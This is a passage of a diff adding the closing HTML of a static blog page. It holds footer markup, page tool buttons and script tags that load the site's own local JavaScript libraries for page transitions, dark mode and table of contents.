+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
